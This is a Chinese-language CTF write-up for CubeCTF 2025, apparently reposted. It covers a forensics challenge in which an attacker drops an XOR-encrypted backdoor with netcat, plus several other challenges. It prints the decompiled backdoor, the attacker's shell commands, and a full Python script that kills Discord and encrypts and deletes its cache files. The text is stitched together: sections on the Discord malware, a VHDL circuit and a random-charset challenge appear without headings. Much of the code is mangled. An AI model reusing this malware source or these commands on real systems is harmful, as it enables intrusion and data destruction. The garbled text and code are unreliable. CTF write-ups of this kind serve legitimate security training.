# CubeCTF 2025 WriteUp

> 原文: https://www.ctfiot.com/262340.html
> ID: 262340

本次比赛我们获得了第40名。（这些题该不会是re✌出的吧，为什么连密码题都沾点逆向💢💢💢）

Forensics

Operator

Challenge

I think someone has been hiding secrets on my server. Can you find them?

Solution

往下翻了下，发现第4条执行了命令id，第6条返回了执行结果uid=0(root) gid=0(root) groups=0(root)

筛选一下，仅保留[PSH,ACK]的流量

tcp.flags == 0x0018

发现这几条流量大致情况如下：

58338->1776：id

1776->58338：uid=0(root) gid=0(root) groups=0(root)

58338->1776：nc -lvp 2025 > /tmp/xcat

47924->2025：【ELF文件的第一部分】

47924->2025：【ELF文件的第二部分】

47924->2025：【ELF文件的第三部分】

58338->1776：chmod +x /tmp/xcat

58338->1776：/tmp/xcat -l 2025 > /tmp/supersecret

53930->2025：【密文1】

53930->2025：【密文2】

53930->2025：【密文3】

53930->2025：【密文4】

53930->2025：【密文5】

53930->2025：【密文6】

攻击者在已经获得root权限的服务器上部署了一个加密的通信后门（/tmp/xcat），攻击者使用这个后门从另一台主机向受害服务器秘密地传输一个文件（/tmp/supersecret），因此接下来要做的就是逆向程序并解开密文

提取出ELF文件，反编译得到的伪代码如下：

__int64 __fastcall main(int n3, char **a2, char **a3)
{
char *s1; // rbp
int v4; // eax
constchar *nptr; // rdi
unsignedint v7; // eax

if ( n3 != 3 )
    return1LL;
  s1 = a2[1];
  v4 = strcmp(s1, "-l");
  nptr = a2[2];
if ( v4 )
  {
    strtol(nptr, 0LL, 10);
    sub_16A0(s1);
  }
else
  {
    v7 = strtol(nptr, 0LL, 10);
    sub_15D0(v7);
  }
return0LL;
}

main函数接收两个参数，如果第一个参数是-l则调用sub_15D0；如果第一个参数不是-l，则将其视为IP地址，调用sub_16A0。

题目中执行的是/tmp/xcat -l 2025，所以走了sub_15D0的逻辑。

unsigned __int64 __fastcall sub_15D0(__int16 a1)
{
int fd; // eax
int fd_1; // ebx
int fd_2; // ebp
struct sockaddr addr_;// [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  addr_ = 0LL;
// ;0x2 -> AF_INET
// 0x1 -> SOCK_STREAM
  fd = socket(2, 1, 0);
if ( fd < 0
    || (fd_1 = fd,
        addr_.sa_family = 2,
        *(_WORD *)addr_.sa_data = __ROL2__(a1, 8),
        *(_DWORD *)&addr_.sa_data[2] = 0,
        bind(fd, &addr_, 0x10u) < 0)
    || listen(fd_1, 1) < 0
    || (fd_2 = accept(fd_1, 0LL, 0LL), fd_2 < 0) )
  {
    exit(1);
  }
  close(fd_1);
  sub_1420((unsignedint)fd_2);
  close(fd_2);
return v6 - __readfsqword(0x28u);
}

sub_15D0函数 (监听模式)创建了一个TCP socket，绑定到所有网络接口 (0.0.0.0) 的指定端口（在这里是2025），listen()并accept()一个连接，一旦连接建立它就把这个连接的socket文件描述符交给sub_1420函数处理。

unsigned __int64 __fastcall sub_16A0(char *cp, __int16 a2)
{
int fd_1; // eax
unsignedint fd; // ebx
struct sockaddr buf;// [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  buf = 0LL;
// ;0x2 -> AF_INET
// 0x1 -> SOCK_STREAM
  fd_1 = socket(2, 1, 0);
if ( fd_1 < 0
    || (fd = fd_1, buf.sa_family = 2, *(_WORD *)buf.sa_data = __ROL2__(a2, 8), inet_pton(2, cp, &buf.sa_data[2]) <= 0)
    || connect(fd, &buf, 0x10u) < 0 )
  {
    exit(1);
  }
  sub_1420(fd);
  close(fd);
return v6 - __readfsqword(0x28u);
}

sub_1420函数是这个后门的核心。它使用select()同时监视两个地方的数据：

网络socket (fd): 从远端（53930）接收数据。

标准输入 (stdin, fd=0): 从本地终端读取数据。

终止 Discord 进程：

脚本使用 psutil.process_iter() 遍历所有正在运行的进程。

如果找到 Discord.exe，它会打印 “Killing Discord…” 并调用 proc.kill() 将其终止。

目的：这是为了解除对 Discord 缓存文件的锁定，确保脚本可以读取、加密并删除它们。

提取加密密钥的“密码”：

脚本定位到 %APPDATA%Discordsentryscope_v3.json 文件。

它加载这个 JSON 文件，并从中提取用户的唯一ID：user_id = sentry_data[‘scope’][‘user’][‘id’]。

生成加密密钥 (Key Derivation)：

脚本使用 PBKDF2 (Password-Based Key Derivation Function 2) 算法从用户ID生成一个32字节（256位）的加密密钥。

密码(Password)：就是上一步提取的 Discord 用户ID。

盐 (Salt)：一个硬编码的值 b’BBBBBBBBBBBBBBBB’。

迭代次数 (Iterations)：1,000,000 次，这增加了暴力破解的难度。

密钥长度 (dkLen)：32字节。

文件加密：

目标目录：%APPDATA%DiscordCacheCache_Data。

加密算法：AES-256，使用 CBC (Cipher Block Chaining) 模式。

初始化向量 (IV)：一个硬编码的值 b’BBBBBBBBBBBBBBBB’ (与 Salt 相同)。

流程： a. 遍历 Cache_Data 目录下的所有文件。 b. 跳过已经有 .enc 后缀的文件。 c. 读取原始文件内容。 d. 使用生成的密钥和IV加密文件内容。 e. 将加密后的数据写入一个新文件，后缀为 .enc。 f. 删除 (unlink) 原始文件。

ram.vhd: 一个可配置的同步RAM模块。

datapath_ctf.vhd: 数据路径单元，负责数据处理。

controller_ctf.vhd: 控制器单元，一个有限状态机（FSM），负责指挥数据路径。

ctf.vhd: 顶层模块，将控制器和数据路径连接在一起。

ctf_testbench.vhd: 测试平台文件，用于在仿真环境中为 ctf 模块提供输入激励。

整个设计采用了经典的控制器-数据路径架构。

ctf_testbench.vhd 是解题的关键，因为它很可能包含了用于产生Flag的输入数据 din。

ram.vhd – 这个模块实现了一个 32×16 位的同步RAM

Generics: w=16 (数据宽度), k=5 (地址宽度, 2^5=32个地址)。

Ports: clk, addr (地址), din (输入数据), dout (输出数据), we (写使能)。

写操作: 当 we 为 ‘1’ 时，将16位的 din 存入 addr 指定的位置。

读操作: 在每个时钟周期，它都会从 addr 读取数据，但输出 dout 之前，会与一个掩码 0x00FF 进行AND运算。这意味着无论RAM里存储了什么，只有低8位会通过 dout 端口输出，高8位被强制清零。

controller_ctf.vhd – 这是一个有5个状态的有限状态机，负责生成控制信号

s_start: 初始状态，发出 ldi=’1′ 复位计数器 i。

s_running: 数据写入阶段。持续32个周期，每周期发出 eni=’1′ (计数器自增) 和 enflag=’1′ (使能RAM写入)。

s_read: 中间状态，再次发出 ldi=’1′ 复位计数器 i。

s_out: 数据读出阶段。持续32个周期，每周期发出 eni=’1’。

s_done: 结束状态，发出 done=’1’。

datapath_ctf.vhd – 这是执行数据操作的单元

iupcount 进程: 一个由 eni 和 ldi 控制的0-31计数器 i。

index <= (i * 5) mod 32;: 这是一个地址置换逻辑。在读出阶段，RAM的读取地址不是顺序的 i，而是经过 (i * 5) mod 32 计算后的乱序地址。这是第二个重要的线索。

flag_process 进程:

其中有一个名为 test_data 的常量数组：

constant test_data : input_array := (
    x"1275", x"D453", x"9E77", x"AA9B",  --3
    x"0167", x"8073", x"8972", x"C053", --7
    x"D166", x"0850", x"1C63", x"A466", --11
    x"C973", x"0E75", x"1F50", x"2067", --15
    x"E353", x"B275", x"7F6E", x"FE64", --19
    x"A963", x"DA63", x"016D", x"9A7F", --23
    x"C07F", x"1474", x"D474", x"B99D", --27
    x"E370", x"C361", x"A366", x"D07F" --31
);

testbench 中的进程明确地将 test_data 的值按顺序赋给了 din 信号，这正是32个输入值。

flag_out 是从RAM读出的值（已经被屏蔽了高8位）。

这行代码将 flag_out 的值减去32，然后输出到顶层端口 dout。这是第三个重要的线索。

写入时 (enflag=’1′): RAM的地址 flag_addr 直接使用计数器 i 的值，实现了顺序写入。flag_in 连接到外部的 din。

读出时 (enflag=’0′): RAM的地址 flag_addr 使用乱序地址 index。

最终计算: dout <= std_logic_vector(to_unsigned(to_integer(unsigned(flag_out)) – 32, dout’length));

ctf_testbench.vhd – 输入数据 din

临时修改字符集：程序内部有一个包含66个字符的固定字符集charset (” _abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}”)。在处理flag[i]时，程序会把charset的第0个字符（原本是_）临时替换为flag[i]。

生成随机索引：调用rand()生成一个随机数，然后通过取模运算rand() % 66得到一个0到65之间的索引idx。

打印字符：程序打印出被临时修改后的charset[idx]。

机会1：如果rand() % 66的结果是0，程序会打印charset[0]，也就是被替换进去的’c’。

机会2：如果rand() % 66的结果是5，程序会打印charset[5]，这仍然是原始字符集中的’c’。

真正的flag[i]字符有两个随机数结果（0和它自己的原始索引）可以导致它被打印。

任何其他字符都只有一个随机数结果（它自己的原始索引）可以导致它被打印。


```
tcp.flags == 0x0018
```



```
__int64 __fastcall main(int n3, char **a2, char **a3)
{
char *s1; // rbp
int v4; // eax
constchar *nptr; // rdi
unsignedint v7; // eax

if ( n3 != 3 )
    return1LL;
  s1 = a2[1];
  v4 = strcmp(s1, "-l");
  nptr = a2[2];
if ( v4 )
  {
    strtol(nptr, 0LL, 10);
    sub_16A0(s1);
  }
else
  {
    v7 = strtol(nptr, 0LL, 10);
    sub_15D0(v7);
  }
return0LL;
}
```



```
unsigned __int64 __fastcall sub_15D0(__int16 a1)
{
int fd; // eax
int fd_1; // ebx
int fd_2; // ebp
struct sockaddr addr_;// [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  addr_ = 0LL;
// ;0x2 -> AF_INET
// 0x1 -> SOCK_STREAM
  fd = socket(2, 1, 0);
if ( fd < 0
    || (fd_1 = fd,
        addr_.sa_family = 2,
        *(_WORD *)addr_.sa_data = __ROL2__(a1, 8),
        *(_DWORD *)&addr_.sa_data[2] = 0,
        bind(fd, &addr_, 0x10u) < 0)
    || listen(fd_1, 1) < 0
    || (fd_2 = accept(fd_1, 0LL, 0LL), fd_2 < 0) )
  {
    exit(1);
  }
  close(fd_1);
  sub_1420((unsignedint)fd_2);
  close(fd_2);
return v6 - __readfsqword(0x28u);
}
```



```
unsigned __int64 __fastcall sub_16A0(char *cp, __int16 a2)
{
int fd_1; // eax
unsignedint fd; // ebx
struct sockaddr buf;// [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  buf = 0LL;
// ;0x2 -> AF_INET
// 0x1 -> SOCK_STREAM
  fd_1 = socket(2, 1, 0);
if ( fd_1 < 0
    || (fd = fd_1, buf.sa_family = 2, *(_WORD *)buf.sa_data = __ROL2__(a2, 8), inet_pton(2, cp, &buf.sa_data[2]) <= 0)
    || connect(fd, &buf, 0x10u) < 0 )
  {
    exit(1);
  }
  sub_1420(fd);
  close(fd);
return v6 - __readfsqword(0x28u);
}
```



```
unsigned __int64 __fastcall sub_1420(int fd)
{
  __int64 v1; // rbx
  __int64 v2; // rax
int i_1; // eax
size_t i; // rdx
int _1; // eax
size_t j_1; // rcx
  __int64 j; // rax
  fd_set readfds; // [rsp+10h] [rbp-4C8h] BYREF
  _BYTE buf[1032]; // [rsp+90h] [rbp-448h] BYREF
unsigned __int64 v11; // [rsp+498h] [rbp-40h]

  v1 = 1LL << fd;
  v11 = __readfsqword(0x28u);
while ( 1 )
  {
    memset(&readfds.fds_bits[2], 0, 112);
    *(__m128i *)readfds.fds_bits = _mm_load_si128((const __m128i *)&xmmword_2010);
    v2 = _fdelt_chk(fd);
    readfds.fds_bits[v2] |= v1;
    if ( select(fd + 1, &readfds, 0LL, 0LL, 0LL) < 0 )
      break;
    if ( (readfds.fds_bits[0] & 1) != 0 )
    {
      i_1 = read(0, buf, 0x400uLL);
      if ( i_1 <= 0 )
        return v11 - __readfsqword(0x28u);
      for ( i = 0LL; i != i_1; ++i )
        buf[i] ^= byte_4010[i & 0xF];
      if ( send(fd, buf, i, 0) != i )
        return v11 - __readfsqword(0x28u);
    }
    if ( (readfds.fds_bits[_fdelt_chk(fd)] & v1) != 0 )
    {
      _1 = recv(fd, buf, 0x400uLL, 0);
      if ( _1 <= 0 )
        return v11 - __readfsqword(0x28u);
      j_1 = _1;
      for ( j = 0LL; j != j_1; ++j )
        buf[j] ^= byte_4010[j & 0xF];
      write(1, buf, j_1);
    }
  }
  perror("select");
return v11 - __readfsqword(0x28u);
}
```



```
LOAD:0000000000004010 ; _BYTE byte_4010[16]
LOAD:0000000000004010 byte_4010       db 4, 7, 17h, 76h, 42h, 69h, 0B0h, 0Bh, 0DEh, 18h, 23h
LOAD:0000000000004010                                         ; DATA XREF: LOAD:00000000000013FB↑o
LOAD:0000000000004010                                         ; sub_1420+E↑o
LOAD:000000000000401B                 db 22h, 1Eh, 0EDh, 0F7h, 0AEh
```



```
# The 16-byte XOR key
KEY = bytes.fromhex("040717764269B00BDE1823221EEDF7AE")

# The 6 encrypted chunks received by the malware
chunks = [
    "4c6e3b562b1a907fb67150027fcd84cb677265136205d965bb2729",
    "4d276403300c9063b16846026d82fd",
    "506f72052749d179bb38504d7388d7d861756e56310cde78b76c4a547bcd99c17062645631069042fe6f424c6acd83c124657256311cc26efe6c4b4767ca85cb24697802620cc87bb16b464614",
    "45696e0123109c2bb67d5147399ed7c37d2763193249c36ebd6a46563e8499c86b757a173600df65e412",
    "67727513390a803bb24713522d9fc3da34756429371a8354b36d4f562fb284da30602429325dc967ee2c475141d596cc303e24457a14ba",
    "4d277f19320c9065b17a4c4667cd91c76a6364563601d17ff0360d28"
]

total_decrypted_data = bytearray()

print("--- Decrypting Data Chunks ---")

# Process each chunk individually
for i, hex_chunk in enumerate(chunks):
    encrypted_bytes = bytes.fromhex(hex_chunk)
    decrypted_chunk = bytearray()
    
    # Apply the repeating XOR key, resetting for each chunk
    for j, byte in enumerate(encrypted_bytes):
        decrypted_byte = byte ^ KEY[j % len(KEY)]
        decrypted_chunk.append(decrypted_byte)
    
    # Add the decrypted chunk to the total
    total_decrypted_data.extend(decrypted_chunk)
    print(f"Chunk {i+1} decrypted ({len(encrypted_bytes)} bytes)")

print("n--- Decryption Complete ---")
print("Total size:", len(total_decrypted_data), "bytes")
print("n--- Restored content of /tmp/supersecret ---")

# Print the final result as a string
print(total_decrypted_data.decode('utf-8'))
```



```
--- Decrypting Data Chunks ---
Chunk 1 decrypted (27 bytes)
Chunk 2 decrypted (15 bytes)
Chunk 3 decrypted (77 bytes)
Chunk 4 decrypted (42 bytes)
Chunk 5 decrypted (55 bytes)
Chunk 6 decrypted (28 bytes)

--- Decryption Complete ---
Total size: 244 bytes

--- Restored content of /tmp/supersecret ---
Hi, is this a secure line?
I sure hope so
These are some very sensitive notes so I want to be sure they're not exposed
Anyway, here's my top secret information:
cube{c00l_0p3r4t0rs_us3_mult1_st4g3_p4yl04ds_8ab49338}
I hope nobody finds that...
```



```
cube{c00l_0p3r4t0rs_us3_mult1_st4g3_p4yl04ds_8ab49338}
```



```
import json
import os
from pathlib import Path
import psutil
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Util.Padding import pad

def get_appdata_path() -> Path:
    if os.getenv('APPDATA') isNone:
        raise RuntimeError('APPDATA environment variable not set??')
    return Path(str(os.getenv('APPDATA'))).resolve()
if __name__ == '__main__':
    for proc in psutil.process_iter():
        if proc.name() == 'Discord.exe':
            print(f'Killing Discord (pid {proc.pid})')
            try:
                proc.kill()
            except psutil.NoSuchProcess:
                print('Process is already dead, ignoring')
    sentry_path = get_appdata_path() + 'Discord' + 'sentry' + 'scope_v3.json'
    with open(sentry_path, 'rb') as f:
        sentry_data = json.load(f)
    user_id = sentry_data['scope']['user']['id']
    salt = b'BBBBBBBBBBBBBBBB'
    key = PBKDF2(str(user_id).encode(), salt, 32, 1000000)
    iv = b'BBBBBBBBBBBBBBBB'
    cache_path = get_appdata_path() + 'Discord' + 'Cache' + 'Cache_Data'
    print(f'Encrypting files in {cache_path}...')
    for file in cache_path.iterdir():
        ifnot file.is_file():
            continue
        if file.suffix == '.enc':
            print(f'Skipping {file} (already encrypted)')
            continue
        try:
            with open(file, 'rb') as fp1:
                data = fp1.read()
        except PermissionError:
                print(f'Skipping {file} (file open)')
                continue
            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
            ciphertext = cipher.encrypt(pad(data, 16))
            print(f'Encrypting {file}...')
            with open(file.with_suffix('.enc'), 'wb') as fp2:
                fp2.write(ciphertext)
            file.unlink()
```



```
import os
from pathlib import Path
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Util.Padding import unpad

# ==============================================================================
# Step 1: Define all constants and parameters found during reverse engineering
# ==============================================================================

# The "password" for the key derivation is the user's Discord ID
USER_ID = "1334198101459861555"

# The hardcoded Salt and IV from the malware
SALT = b'BBBBBBBBBBBBBBBB'
IV = b'BBBBBBBBBBBBBBBB'

# PBKDF2 parameters
ITERATIONS = 1000000
KEY_LENGTH_BYTES = 32

# Path to the encrypted files
try:
    CACHE_PATH = Path("./Cache_Data") # 把 Cache_Data 文件夹提取出来，这里面填 Cache_Data 的路径
except TypeError:
    print("[!] ERROR: Could not determine the APPDATA path. Exiting.")
    exit()

# ==============================================================================
# Step 2: Re-create the exact same AES key the malware used
# ==============================================================================

print("[*] Recreating the encryption key using PBKDF2...")
print(f"    - User ID (Password): {USER_ID}")
print(f"    - Salt: {SALT.decode()}")
print(f"    - Iterations: {ITERATIONS}")

# The PBKDF2 function derives the key. All parameters must match exactly.
# Note: The malware encoded the user ID string to bytes before using it.
key = PBKDF2(
    password=USER_ID.encode('utf-8'), 
    salt=SALT, 
    dkLen=KEY_LENGTH_BYTES, 
    count=ITERATIONS
)

print(f"[+] Key successfully derived: {key.hex()}")
print("-" * 50)

# ==============================================================================
# Step 3: Find, decrypt, and restore each encrypted file
# ==============================================================================

ifnot CACHE_PATH.exists():
    print(f"[!] Target directory not found: {CACHE_PATH}")
    print("[!] No files to decrypt. Exiting.")
    exit()

print(f"[*] Searching for .enc files in: {CACHE_PATH}n")
decrypted_count = 0
failed_count = 0

for file_path in CACHE_PATH.glob('*.enc'):
    print(f"[*] Found encrypted file: {file_path.name}")
    
    try:
        # Read the encrypted content from the .enc file
        with open(file_path, 'rb') as f_in:
            ciphertext = f_in.read()

        # Create the AES cipher object with the derived key and hardcoded IV
        cipher = AES.new(key, AES.MODE_CBC, iv=IV)

        # Decrypt the data and remove the PKCS7 padding
        padded_plaintext = cipher.decrypt(ciphertext)
        plaintext = unpad(padded_plaintext, AES.block_size)

        # Create the original filename by removing the '.enc' suffix
        original_file_path = file_path.with_suffix('')

        # Write the decrypted content to the original file
        with open(original_file_path, 'wb') as f_out:
            f_out.write(plaintext)
        
        print(f"    -> [+] SUCCESS: Decrypted and saved to {original_file_path.name}")

        # Securely remove the encrypted file after successful decryption
        os.remove(file_path)
        print(f"    -> [-] Removed {file_path.name}")
        decrypted_count += 1

    except Exception as e:
        print(f"    -> [!] ERROR: Failed to decrypt {file_path.name}. Reason: {e}")
        failed_count += 1
    
    print() # Add a newline for readability

# ==============================================================================
# Step 4: Final report
# ==============================================================================
print("-" * 50)
print("Decryption process finished.")
print(f"Summary: {decrypted_count} files successfully decrypted, {failed_count} files failed.")
```



```
import os
from pathlib import Path

# ==============================================================================
# Expanded File Signature Database (Magic Numbers)
#
# This dictionary maps a file extension to its signature (in hex bytes).
# Signatures are ordered from more specific to more general where overlap exists.
# ==============================================================================
FILE_SIGNATURES = {
    # Images
    '.png': b'x89x50x4Ex47x0Dx0Ax1Ax0A',
    '.jpg': b'xFFxD8xFF',
    '.gif': b'x47x49x46x38',
    '.webp': b'x52x49x46x46', # RIFF format, requires special check
    '.bmp': b'x42x4D',
    '.ico': b'x00x00x01x00',

    # Audio
    '.mp3': b'x49x44x33',      # ID3v2 tag
    '.flac': b'x66x4Cx61x43',
    '.wav': b'x52x49x46x46', # RIFF format, could be WAV or AVI
    '.ogg': b'x4Fx67x67x53',
    
    # Video
    '.mp4': b'x00x00x00x18x66x74x79x70', # Common start with 'ftyp'
    '.mov': b'x00x00x00x14x66x74x79x70x71x74',
    '.avi': b'x52x49x46x46', # RIFF format
    '.mkv': b'x1Ax45xDFxA3',

    # Archives
    '.zip': b'x50x4Bx03x04',
    '.rar': b'x52x61x72x21x1Ax07x00',
    '.gz': b'x1Fx8Bx08',
    '.7z': b'x37x7AxBCxAFx27x1C',
    
    # Documents
    '.pdf': b'x25x50x44x46x2D',
    
    # Fonts
    '.ttf': b'x00x01x00x00x00',
    '.otf': b'x4Fx54x54x4F',

    # Others
    '.sqlite': b'x53x51x4Cx69x74x65x20x66x6fx72x6dx61x74x20x33'
}

def get_file_type_and_ext(file_path):
    """
    Identifies the file type and returns the corresponding extension.
    """
    try:
        with open(file_path, 'rb') as f:
            file_header = f.read(32)
            ifnot file_header:
                return"Empty File", None

            # Iterate through signatures to find a match
            for ext, signature in FILE_SIGNATURES.items():
                if file_header.startswith(signature):
                    # Special handling for container formats like RIFF (WAV, AVI, WEBP)
                    if ext in ['.webp', '.wav', '.avi']:
                        f.seek(8)
                        fourcc = f.read(4)
                        if fourcc == b'WEBP':
                            return"WEBP Image", '.webp'
                        elif fourcc == b'WAVE':
                            return"WAV Audio", '.wav'
                        elif fourcc == b'AVI ':
                            return"AVI Video", '.avi'
                        continue# Continue if it's a RIFF but not one we can specify

                    returnf"{ext[1:].upper()} File", ext

            return"Unknown Binary", None

    except IOError:
        return"Read Error", None

def main():
    """
    Main function to iterate, identify, and rename files in a directory.
    """
    target_directory = Path("./Cache_Data") # 这里面填 Cache_Data 的路径
    
    ifnot target_directory.is_dir():
        print(f"[!] Error: Directory not found at '{target_directory}'")
        return

    print(f"[*] Starting file identification and renaming in: {target_directory}n")
    
    summary = {"renamed": 0, "skipped": 0, "unknown": 0, "error": 0}
    type_counts = {}

    for file_path in sorted(target_directory.iterdir()):
        ifnot file_path.is_file():
            continue

        # Skip files that already have an extension
        if file_path.suffix:
            print(f"  - Skipping: {file_path.name:<30} (already has an extension)")
            summary["skipped"] += 1
            continue
        
        file_type, new_ext = get_file_type_and_ext(file_path)

        if new_ext:
            # Construct the new file path
            new_file_path = file_path.with_suffix(new_ext)
            
            # Handle potential file name conflicts
            counter = 1
            while new_file_path.exists():
                new_file_path = file_path.parent / f"{file_path.name}.{counter}{new_ext}"
                counter += 1

            # Rename the file
            try:
                file_path.rename(new_file_path)
                print(f"  - Renamed:  {file_path.name:<30} -> {new_file_path.name} ({file_type})")
                summary["renamed"] += 1
                type_counts[file_type] = type_counts.get(file_type, 0) + 1
            except OSError as e:
                print(f"  - Error:    Could not rename {file_path.name}. Reason: {e}")
                summary["error"] += 1
        else:
            print(f"  - Unknown:  {file_path.name:<30} (Type: {file_type})")
            summary["unknown"] += 1

    # Print a summary report
    print("n" + "="*60)
    print("                      Process Summary")
    print("="*60)
    print(f"  - Files Renamed: {summary['renamed']}")
    print(f"  - Files Skipped (already had extension): {summary['skipped']}")
    print(f"  - Files with Unknown Type: {summary['unknown']}")
    print(f"  - Renaming Errors: {summary['error']}")
    print("n" + "="*60)
    print("                 Identified File Type Counts")
    print("="*60)
    ifnot type_counts:
        print("No new file types were identified and renamed.")
    else:
        for f_type, count in sorted(type_counts.items(), key=lambda item: item[1], reverse=True):
            print(f"  - {f_type:<25}: {count} file(s)")
    print("="*60)

if __name__ == "__main__":
    main()
```



```
[*] Starting file identification and renaming in: Cache_Data

  - Unknown:  data_0                         (Type: Unknown Binary)
  - Unknown:  data_1                         (Type: Unknown Binary)
  - Unknown:  data_2                         (Type: Unknown Binary)
  - Unknown:  data_3                         (Type: Unknown Binary)
  - Unknown:  f_000001                       (Type: Unknown Binary)
  - Unknown:  f_000002                       (Type: Unknown Binary)
  - Unknown:  f_000003                       (Type: Unknown Binary)
  - Unknown:  f_000004                       (Type: Unknown Binary)
  - Unknown:  f_000005                       (Type: Unknown Binary)
  - Unknown:  f_000006                       (Type: Unknown Binary)
  - Unknown:  f_000007                       (Type: Unknown Binary)
  - Unknown:  f_000008                       (Type: Unknown Binary)
  - Unknown:  f_000009                       (Type: Unknown Binary)
  - Unknown:  f_00000a                       (Type: Unknown Binary)
  - Unknown:  f_00000b                       (Type: Unknown Binary)
  - Unknown:  f_00000c                       (Type: Unknown Binary)
  - Unknown:  f_00000d                       (Type: Unknown Binary)
  - Unknown:  f_00000e                       (Type: Unknown Binary)
  - Unknown:  f_00000f                       (Type: Unknown Binary)
  - Unknown:  f_000010                       (Type: Unknown Binary)
  - Unknown:  f_000011                       (Type: Unknown Binary)
  - Unknown:  f_000012                       (Type: Unknown Binary)
  - Unknown:  f_000013                       (Type: Unknown Binary)
  - Unknown:  f_000014                       (Type: Unknown Binary)
  - Unknown:  f_000015                       (Type: Unknown Binary)
  - Unknown:  f_000016                       (Type: Unknown Binary)
  - Unknown:  f_000017                       (Type: Unknown Binary)
  - Unknown:  f_000018                       (Type: Unknown Binary)
  - Unknown:  f_000019                       (Type: Unknown Binary)
  - Unknown:  f_00001a                       (Type: Unknown Binary)
  - Unknown:  f_00001b                       (Type: Unknown Binary)
  - Unknown:  f_00001c                       (Type: Unknown Binary)
  - Unknown:  f_00001d                       (Type: Unknown Binary)
  - Unknown:  f_00001e                       (Type: Unknown Binary)
  - Unknown:  f_00001f                       (Type: Unknown Binary)
  - Unknown:  f_000020                       (Type: Unknown Binary)
  - Unknown:  f_000021                       (Type: Unknown Binary)
  - Unknown:  f_000022                       (Type: Unknown Binary)
  - Unknown:  f_000023                       (Type: Unknown Binary)
  - Unknown:  f_000024                       (Type: Unknown Binary)
  - Unknown:  f_000025                       (Type: Unknown Binary)
  - Unknown:  f_000026                       (Type: Unknown Binary)
  - Unknown:  f_000027                       (Type: Unknown Binary)
  - Unknown:  f_000028                       (Type: Unknown Binary)
  - Unknown:  f_000029                       (Type: Unknown Binary)
  - Unknown:  f_00002a                       (Type: Unknown Binary)
  - Unknown:  f_00002b                       (Type: Unknown Binary)
  - Unknown:  f_00002c                       (Type: Unknown Binary)
  - Unknown:  f_00002d                       (Type: Unknown Binary)
  - Unknown:  f_00002e                       (Type: Unknown Binary)
  - Renamed:  f_00002f                       -> f_00002f.gz (GZ File)
  - Unknown:  f_000030                       (Type: Unknown Binary)
  - Renamed:  f_000031                       -> f_000031.mp3 (MP3 File)
  - Renamed:  f_000032                       -> f_000032.mkv (MKV File)
  - Unknown:  f_000033                       (Type: Unknown Binary)
  - Unknown:  f_000034                       (Type: Unknown Binary)
  - Unknown:  f_000035                       (Type: Unknown Binary)
  - Renamed:  f_000036                       -> f_000036.jpg (JPG File)
  - Renamed:  f_000037                       -> f_000037.jpg (JPG File)
  - Renamed:  f_000038                       -> f_000038.mp3 (MP3 File)
  - Renamed:  f_000039                       -> f_000039.png (PNG File)
  - Renamed:  f_00003a                       -> f_00003a.png (PNG File)
  - Unknown:  f_00003b                       (Type: Unknown Binary)
  - Renamed:  f_00003c                       -> f_00003c.gz (GZ File)
  - Renamed:  f_00003d                       -> f_00003d.webp (WEBP Image)
  - Renamed:  f_00003e                       -> f_00003e.webp (WEBP Image)
  - Renamed:  f_00003f                       -> f_00003f.webp (WEBP Image)
  - Renamed:  f_000040                       -> f_000040.webp (WEBP Image)
  - Renamed:  f_000041                       -> f_000041.webp (WEBP Image)
  - Renamed:  f_000042                       -> f_000042.webp (WEBP Image)
  - Renamed:  f_000043                       -> f_000043.webp (WEBP Image)
  - Renamed:  f_000044                       -> f_000044.webp (WEBP Image)
  - Renamed:  f_000045                       -> f_000045.webp (WEBP Image)
  - Renamed:  f_000046                       -> f_000046.webp (WEBP Image)
  - Renamed:  f_000047                       -> f_000047.webp (WEBP Image)
  - Renamed:  f_000048                       -> f_000048.webp (WEBP Image)
  - Renamed:  f_000049                       -> f_000049.webp (WEBP Image)
  - Renamed:  f_00004a                       -> f_00004a.webp (WEBP Image)
  - Unknown:  f_00004b                       (Type: Unknown Binary)
  - Renamed:  f_00004c                       -> f_00004c.webp (WEBP Image)
  - Renamed:  f_00004d                       -> f_00004d.webp (WEBP Image)
  - Unknown:  f_00004e                       (Type: Unknown Binary)
  - Renamed:  f_00004f                       -> f_00004f.webp (WEBP Image)
  - Renamed:  f_000050                       -> f_000050.webp (WEBP Image)
  - Renamed:  f_000051                       -> f_000051.webp (WEBP Image)
  - Renamed:  f_000052                       -> f_000052.jpg (JPG File)
  - Renamed:  f_000053                       -> f_000053.jpg (JPG File)
  - Renamed:  f_000054                       -> f_000054.jpg (JPG File)
  - Renamed:  f_000055                       -> f_000055.jpg (JPG File)
  - Renamed:  f_000056                       -> f_000056.jpg (JPG File)
  - Renamed:  f_000057                       -> f_000057.jpg (JPG File)
  - Renamed:  f_000058                       -> f_000058.jpg (JPG File)
  - Renamed:  f_000059                       -> f_000059.webp (WEBP Image)
  - Renamed:  f_00005a                       -> f_00005a.webp (WEBP Image)
  - Renamed:  f_00005b                       -> f_00005b.jpg (JPG File)
  - Unknown:  f_00005c                       (Type: Unknown Binary)
  - Unknown:  f_00005d                       (Type: Unknown Binary)
  - Unknown:  f_00005e                       (Type: Unknown Binary)
  - Unknown:  f_00005f                       (Type: Unknown Binary)
  - Unknown:  f_000060                       (Type: Unknown Binary)
  - Unknown:  f_000061                       (Type: Unknown Binary)
  - Unknown:  f_000062                       (Type: Unknown Binary)
  - Unknown:  f_000063                       (Type: Unknown Binary)
  - Unknown:  f_000064                       (Type: Unknown Binary)
  - Unknown:  f_000065                       (Type: Unknown Binary)
  - Unknown:  f_000066                       (Type: Unknown Binary)
  - Unknown:  f_000067                       (Type: Unknown Binary)
  - Unknown:  f_000068                       (Type: Unknown Binary)
  - Unknown:  f_000069                       (Type: Unknown Binary)
  - Unknown:  f_00006a                       (Type: Unknown Binary)
  - Unknown:  f_00006b                       (Type: Unknown Binary)
